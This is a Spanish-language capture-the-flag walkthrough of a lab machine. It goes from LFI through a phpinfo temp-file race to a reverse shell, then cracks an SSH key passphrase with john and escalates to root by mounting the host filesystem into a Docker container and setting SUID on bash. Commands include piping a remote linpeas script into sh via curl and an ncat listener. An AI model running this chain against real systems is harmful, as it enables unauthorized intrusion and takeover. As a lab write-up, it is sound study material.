____
#medium #phpinfo #LFI #fuzzing_parametros #disable_functions 
______
**Escaneo Nmap 

![[Pasted image 20250410085754.png]]

**Port 80

*Whatweb*

![[Pasted image 20250410090129.png]]

*Fuzzing*

![[Pasted image 20250410090622.png]]

El **/php.info** está expuesto, esto puede darnos mucha información importante y posibles vectores.
____
**PHP.INFO

![[Pasted image 20250410093119.png]]
___
*allow_url_fopen*

Con el allow_url_fopen *On* podemos tener un posible vector de LFI

**Respuesta de chatgpt** de que se puede conseguir con [[allow_url_fopen]] mal configurado
___
*disable_functions*

Si en esta no hay ningún valor, al lograr subir un archivo podríamos ejecutar todo tipo de funciones 


- `exec()`
- `shell_exec()`
- `system()`
- `passthru()`
- `popen()`
- `proc_open()`

**Respuesta de chatgpt** de que se puede conseguir con [[disable_functions]] mal configurado
______
**FUZZING DE PARAMETROS** 

![[Pasted image 20250410095136.png]]

```bash
ffuf -u 'http://10.10.2.54/index.php?FUZZ=../../../../../../../../etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -fl=137
```

Tenemos un LFI bastante limitado solo podemos ver el /etc/passwd

![[Pasted image 20250410095804.png]]

Cosas a probar para escalar desde un [[LFI]] 

Como nada a funcionado a parte de ver el /etc/passwd probaremos mas cosas
__________

Probaremos a subir archivos ya que **file_uploads** está en *On*

![[Pasted image 20250410104014.png]]


Enviaremos una petición por POST a /info.php con un formato [boundary](https://developer.mozilla.org/es/docs/Web/HTTP/Reference/Methods/POST)

![[Pasted image 20250414095842.png]]

Como las subidas de archivos primero se almacenan en un archivo temporal buscaremos en la respuesta del servidor algo como **tmp_** 

![[Pasted image 20250414100137.png]]

Ahora usaremos un script de [hacktricks](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html) para subir un reverse shell y entablar una conexion, con chatgpt he convertido el script [[phpinfolfi.py]] a python3 

Tenemos que setear el **Payload** , el path de **info.php** y  la pagina donde se produce el **LFI**

Luego ejecutaremos el script con python3 o 2.7 en su version original con el siguiente comando

```bash
python3 phpinfolfi.py <ip victima> <port>
```

nos pondremos en escucha por el puerto que hemos seteado en el script con ncat

```bash
sudo ncat -nlvp <port>
```

_________________________________

# ESCALADA DE PRIVILEGIOS

Después de comprobar:

```
sudo -l
```

```bash
find / -perm -4000 2>/dev/null
```

```
hostname -I
```

podemos comprobar que es un contenedor Docker por la IP.

En la contenedor no hay wget ni nc ni ncat pero si curl para poder descargar linpeas

```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

en el escaneo podemos ver un archivo .tgz raro en root

![[Pasted image 20250415123941.png]]

lo copiamos a /tmp y lo descomprimimos con tar:

```bash
tar -xf oldkeys.tgz
```

obtenemos dos archivos **root  root.pub** son claves rsa encriptadas

![[Pasted image 20250415124246.png]]

Nos copiamos este archivo en nuestra maquina

primero las pasamos por **ssh2john.py** para obstener un hash y posteriormente crackearlo con john

```bash
ssh2john id_rsa
```

```bash
john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt id_rsa
```

![[Pasted image 20250415124840.png]]

la contraseña es **choclate93** , como pone en el archivo root.pub es para el usuario **root**

```
su root
```

y la contraseña

ejecutamos linpeas.sh otra vez pero ahora como root y vemos el ssh

![[Pasted image 20250415130657.png]]

volemos a hacer el mismo procedimiento para desencryptarlo y es la misma contraseña, como vemos en el id_rsa.pub sirve para loguearse por ssh en admin@192.168.150.1

```bash
ssh -i id_rsa admin@192.168.150.1
```

ahora que hemos salido del contenedor de docker miramos si nuestro usuario esta en el grupo docker y asi es.

podemos crear un nuevo contenedor con una montura del equipo victima y desde esta darle privilegios SUID a la bash

**Creamos un contenedor con una montura desde la raiz del equipo victima usando la imagen que ya esta descargada
```bash
docker run -dit -v /:/mnt/root theart42/infovore
```

**Nos desplegamos una bash con este contenedor

```bash
docker exec -it happy_jones bash
```

**Damos permisos SUID a la bash

```bash
cd /mnt/root
cd bin/
chmod u+s bash
```

salimos del contenedor

```bash
bash -p
```


```bash
cat /root/root.txt
```

![[Pasted image 20250416104559.png]]